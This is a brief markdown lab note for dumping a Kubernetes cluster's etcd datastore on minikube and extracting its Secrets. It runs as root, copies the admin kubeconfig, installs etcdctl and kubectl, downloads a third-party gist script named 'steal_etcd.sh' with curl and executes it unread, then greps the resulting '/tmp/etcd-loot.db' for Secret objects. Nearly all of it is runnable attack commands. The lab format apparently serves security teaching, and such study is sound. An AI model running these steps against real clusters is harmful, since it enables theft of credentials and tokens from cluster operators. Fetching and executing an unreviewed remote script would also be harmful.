# steal etcd secrets lab
1. Steal etcd
```bash
./steal_etcd.sh
```

1. Initial setup 
```bash
minikube ssh
sudo su
cp /etc/kubernetes/admin.conf /root/.kube/config

# Install etcdctl oneliner
mkdir -p /tmp/etcd-download-test ;\
ETCD_VER=v3.5.18 ;\
DOWNLOAD_URL="https://storage.googleapis.com/etcd" ;\
curl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz ;\
tar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C /tmp/etcd-download-test --strip-components=1 ;\
chown -R root:root /tmp/etcd-download-test/* ;\
mv /tmp/etcd-download-test/etcd* /bin

apt update && apt install binutils -y

```

```bash
# cat steal_etcd.yaml

PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '

# Install kubectl
LOS_KUBE_VERSION="v1.30.0" ; curl -LO https://dl.k8s.io/release/$LOS_KUBE_VERSION/bin/linux/amd64/kubectl && chmod +x kubectl && mv ./kubectl /usr/bin/ ; kubectl version

# Steal etcd
curl https://gist.githubusercontent.com/grahamhelton/0740e1fc168f241d1286744a61a1e160/raw/36a0803bd2df27133f7d332dacc1c9c0e3881616/steal_etcd.sh > steal_etcd.sh 

chmod +x steal_etcd.sh

./steal_etcd.sh


# Grep for secrets
strings /tmp/etcd-loot.db | grep "kind\":\"Secret"

# This is almost the same as running
kubectl get secrets -o yaml
```
